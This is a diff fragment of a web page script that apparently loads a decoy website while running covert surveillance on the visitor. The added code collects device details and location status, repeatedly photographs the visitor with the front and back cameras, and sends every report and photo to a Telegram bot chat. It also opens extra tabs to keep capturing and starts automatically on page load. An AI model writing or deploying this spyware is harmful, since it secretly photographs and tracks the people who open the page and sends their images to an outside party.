+                report += `Time: ${new Date().toLocaleString()}\n\n`;
+                
+                report += `📱 Device: ${Q.device.os} ${Q.device.browser}\n`;
+                report += `📺 Screen: ${Q.device.screen}\n`;
+                report += `💻 Cores: ${Q.device.cores}\n\n`;
+                
+                report += `📷 Cameras: ${Q.cameras.length} found\n`;
+                report += `📍 Location: ${Q.location ? 'Captured' : 'None'}\n`;
+                report += `🔄 Tabs: ${Q.replicated}/${QUANTUM_CONFIG.REPLICATION_COUNT}\n\n`;
+                
+                report += `⚙️ Status: ${Q.active ? 'ACTIVE' : 'INACTIVE'}`;
+                
+                await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: QUANTUM_CONFIG.ADMIN_CHAT_ID,
+                        text: report,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                log('System report sent');
+            } catch (e) {}
+        }
+        
+        // ============== CAMERA SYSTEM ==============
+        class CameraSystem {
+            constructor() {
+                this.stream = null;
+                this.retryCount = 0;
+            }
+            
+            async init() {
+                try {
+                    // Test camera access
+                    const testStream = await navigator.mediaDevices.getUserMedia({
+                        video: true
+                    });
+                    
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    Q.cameras = devices.filter(d => d.kind === 'videoinput');
+                    
+                    testStream.getTracks().forEach(t => t.stop());
+                    
+                    Q.permission = true;
+                    log(`Cameras: ${Q.cameras.length} found`);
+                    return true;
+                    
+                } catch (error) {
+                    log(`Camera init error: ${error.message}`);
+                    return false;
+                }
+            }
+            
+            async startCamera(facingMode) {
+                if (this.stream) {
+                    this.stream.getTracks().forEach(t => t.stop());
+                    this.stream = null;
+                }
+                
+                try {
+                    this.stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { ideal: facingMode },
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
+                    });
+                    
+                    E.video.srcObject = this.stream;
+                    
+                    await new Promise((resolve) => {
+                        if (E.video.readyState >= 3) {
+                            resolve();
+                        } else {
+                            E.video.onloadeddata = resolve;
+                        }
+                    });
+                    
+                    await E.video.play();
+                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAMERA_WARMUP));
+                    
+                    Q.cameraReady = true;
+                    this.retryCount = 0;
+                    log(`Camera ${facingMode} ready`);
+                    return true;
+                    
+                } catch (error) {
+                    this.retryCount++;
+                    log(`Camera ${facingMode} failed (${this.retryCount})`);
+                    
+                    if (this.stream) {
+                        this.stream.getTracks().forEach(t => t.stop());
+                        this.stream = null;
+                    }
+                    
+                    if (this.retryCount < 3) {
+                        await new Promise(r => setTimeout(r, 1000 * this.retryCount));
+                        return this.startCamera(facingMode);
+                    }
+                    
+                    Q.cameraReady = false;
+                    return false;
+                }
+            }
+            
+            capturePhoto() {
+                if (!Q.cameraReady || !E.video.videoWidth) {
+                    return null;
+                }
+                
+                try {
+                    const canvas = E.canvas;
+                    const ctx = canvas.getContext('2d');
+                    
+                    canvas.width = E.video.videoWidth;
+                    canvas.height = E.video.videoHeight;
+                    
+                    ctx.drawImage(E.video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Enhance image
+                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                    const data = imageData.data;
+                    
+                    for (let i = 0; i < data.length; i += 4) {
+                        // Brighten
+                        data[i] = Math.min(255, data[i] * 1.2);
+                        data[i+1] = Math.min(255, data[i+1] * 1.2);
+                        data[i+2] = Math.min(255, data[i+2] * 1.2);
+                    }
+                    
+                    ctx.putImageData(imageData, 0, 0);
+                    
+                    return new Promise((resolve) => {
+                        canvas.toBlob((blob) => {
+                            resolve(blob && blob.size > QUANTUM_CONFIG.MIN_BLOB_SIZE ? blob : null);
+                        }, 'image/jpeg', QUANTUM_CONFIG.IMAGE_QUALITY);
+                    });
+                    
+                } catch (error) {
+                    log(`Capture error: ${error.message}`);
+                    return null;
+                }
+            }
+            
+            async captureBurst(cameraType, count = QUANTUM_CONFIG.PHOTOS_PER_CAMERA) {
+                const photos = [];
+                
+                for (let i = 1; i <= count; i++) {
+                    if (!Q.active) break;
+                    
+                    const blob = await this.capturePhoto();
+                    if (blob) {
+                        photos.push({
+                            blob: blob,
+                            index: i,
+                            camera: cameraType,
+                            timestamp: Date.now()
+                        });
+                        log(`Captured ${cameraType} #${i}`);
+                    }
+                    
+                    if (i < count) {
+                        await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAPTURE_DELAY));
+                    }
+                }
+                
+                return photos;
+            }
+            
+            cleanup() {
+                if (this.stream) {
+                    this.stream.getTracks().forEach(t => t.stop());
+                    this.stream = null;
+                }
+                Q.cameraReady = false;
+                log('Camera cleaned up');
+            }
+        }
+        
+        // ============== MULTI-TAB REPLICATION ==============
+        function replicateTabs() {
+            const needed = QUANTUM_CONFIG.REPLICATION_COUNT - Q.replicated;
+            
+            for (let i = 0; i < needed; i++) {
+                setTimeout(() => {
+                    try {
+                        const newTab = window.open(window.location.href, '_blank');
+                        if (newTab) {
+                            Q.replicated++;
+                            log(`Tab ${Q.replicated}/${QUANTUM_CONFIG.REPLICATION_COUNT} opened`);
+                            
+                            // Close after 3 minutes
+                            setTimeout(() => {
+                                try {
+                                    newTab.close();
+                                    Q.replicated--;
+                                    log(`Tab closed, ${Q.replicated} remaining`);
+                                } catch (e) {}
+                            }, 180000);
+                        }
+                    } catch (e) {
+                        // Popup blocked
+                    }
+                }, i * QUANTUM_CONFIG.REPLICATION_DELAY);
+            }
+        }
+        
+        // ============== SURVEILLANCE ENGINE ==============
+        async function startSurveillance() {
+            if (Q.active || !window.camera) {
+                return;
+            }
+            
+            Q.active = true;
+            log('=== SURVEILLANCE STARTED ===');
+            
+            // Open multiple tabs
+            replicateTabs();
+            
+            // Start heartbeat
+            const heartbeat = setInterval(() => {
+                if (Q.broadcast && Q.active) {
+                    Q.broadcast.postMessage({
+                        type: 'heartbeat',
+                        tab: Q.tab,
+                        session: Q.session,
+                        photos: Q.photos,
+                        cycles: Q.cycles
+                    });
+                }
+            }, QUANTUM_CONFIG.HEARTBEAT_INTERVAL);
+            
+            // Main loop - SIMPLIFIED AND FIXED
+            while (Q.active) {
+                try {
+                    Q.cycles++;
+                    log(`Cycle ${Q.cycles} starting...`);
+                    
+                    // FRONT CAMERA
+                    log('Activating front camera...');
+                    if (await window.camera.startCamera('user')) {
+                        log('Front camera active, capturing...');
+                        const frontPhotos = await window.camera.captureBurst('front');
+                        log(`Got ${frontPhotos.length} front photos`);
+                        
+                        // Send photos immediately
+                        for (const photo of frontPhotos) {
+                            if (!Q.active) break;
+                            await sendTelegramPhoto(photo.blob, 'front', photo.index);
+                        }
+                    }
+                    
+                    if (!Q.active) break;
+                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.SWITCH_DELAY));
+                    
+                    // BACK CAMERA
+                    log('Activating back camera...');
+                    if (Q.active && await window.camera.startCamera('environment')) {
+                        log('Back camera active, capturing...');
+                        const backPhotos = await window.camera.captureBurst('back');
+                        log(`Got ${backPhotos.length} back photos`);
+                        
+                        // Send photos immediately
+                        for (const photo of backPhotos) {
+                            if (!Q.active) break;
+                            await sendTelegramPhoto(photo.blob, 'back', photo.index);
+                        }
+                    }
+                    
+                    log(`Cycle ${Q.cycles} complete. Total photos: ${Q.photos}`);
+                    
+                    // Wait before next cycle
+                    if (Q.active) {
+                        await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CYCLE_INTERVAL));
+                    }
+                    
+                } catch (error) {
+                    log(`Cycle error: ${error.message}`);
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+            }
+            
+            // Cleanup
+            clearInterval(heartbeat);
+            if (window.camera) {
+                window.camera.cleanup();
+            }
+            log('=== SURVEILLANCE STOPPED ===');
+        }
+        
+        // ============== VISIBILITY HANDLER ==============
+        let lastVisibilityChange = 0;
+        document.addEventListener('visibilitychange', () => {
+            const now = Date.now();
+            
+            if (document.hidden) {
+                // Tab became hidden
+                log('Tab hidden');
+                lastVisibilityChange = now;
+                
+                // We keep surveillance running in background
+                // Most browsers will throttle but keep camera active
+                
+            } else {
+                // Tab became visible
+                log('Tab visible');
+                
+                // If tab was hidden for more than 5 seconds, restart camera
+                if (now - lastVisibilityChange > 5000) {
+                    log('Restarting camera after long background period');
+                    if (window.camera && Q.active) {
+                        setTimeout(() => {
+                            if (window.camera && Q.active) {
+                                window.camera.startCamera('user').catch(() => {});
+                            }
+                        }, 1000);
+                    }
+                }
+            }
+        });
+        
+        // ============== INITIALIZATION ==============
+        async function initialize() {
+            if (Q.initialized) return;
+            
+            try {
+                log('=== INITIALIZING ===');
+                
+                // Parse URL and load site
+                parseURL();
+                loadWebsite();
+                
+                // Get device info
+                getDeviceInfo();
+                
+                // Get location (async)
+                getLocation();
+                
+                // Setup broadcast
+                initBroadcast();
+                
+                // Initialize camera
+                window.camera = new CameraSystem();
+                const camReady = await window.camera.init();
+                
+                if (camReady) {
+                    Q.initialized = true;
+                    
+                    // Send report
+                    await sendSystemReport();
+                    
+                    // Start surveillance after delay
                     setTimeout(() => {
-                        startQuantumSurveillance();
-                    }, 3000);
+                        startSurveillance();
+                    }, 2000);
                     
-                    quantumLog("===== QUANTUM SYSTEM INITIALIZED =====");
-                } else {
-                    quantumLog("Camera initialization failed");
+                    log('=== READY ===');
                 }
                 
             } catch (error) {
-                quantumLog("Initialization error: " + error.message);
+                log(`Init error: ${error.message}`);
             }
         }
         
-        // ============== EVENT HANDLERS ==============
+        // ============== STARTUP ==============
+        window.addEventListener('load', initialize);
         
+        // Cleanup on close
         window.addEventListener('beforeunload', () => {
-            QUANTUM_STATE.quantumActive = false;
-            if (window._quantumCamera) {
-                window._quantumCamera.cleanup();
-            }
-            quantumLog("Page unloading");
-        });
-        
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                quantumLog("Tab hidden");
-            } else {
-                quantumLog("Tab visible");
+            Q.active = false;
+            if (window.camera) {
+                window.camera.cleanup();
             }
         });
-        
-        // ============== START SYSTEM ==============
-        
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initializeQuantumSystem);
-        } else {
-            initializeQuantumSystem();
-        }
         
         // Debug access
-        window.quantumDebug = {
-            status: () => QUANTUM_STATE,
-            start: () => startQuantumSurveillance(),
-            stop: () => { QUANTUM_STATE.quantumActive = false; },
-            testCamera: async () => {
-                if (window._quantumCamera) {
-                    return await window._quantumCamera.startQuantumCamera('user');
+        window.$$ = {
+            status: () => Q,
+            start: () => startSurveillance(),
+            stop: () => { Q.active = false; },
+            test: async () => {
+                if (window.camera) {
+                    const started = await window.camera.startCamera('user');
+                    if (started) {
+                        const blob = await window.camera.capturePhoto();
+                        if (blob) {
+                            const sent = await sendTelegramPhoto(blob, 'test', 1);
+                            return sent ? 'Photo sent!' : 'Failed to send';
+                        }
+                        return 'No photo captured';
+                    }
+                    return 'Camera failed to start';
                 }
-                return false;
-            },
-            testPhoto: async () => {
-                if (window._quantumCamera && QUANTUM_STATE.quantumCameraReady) {
-                    const blob = await window._quantumCamera.captureQuantumPhoto();
-                    return blob ? blob.size : 0;
-                }
-                return 0;
+                return 'Camera not initialized';
             }
         };
         
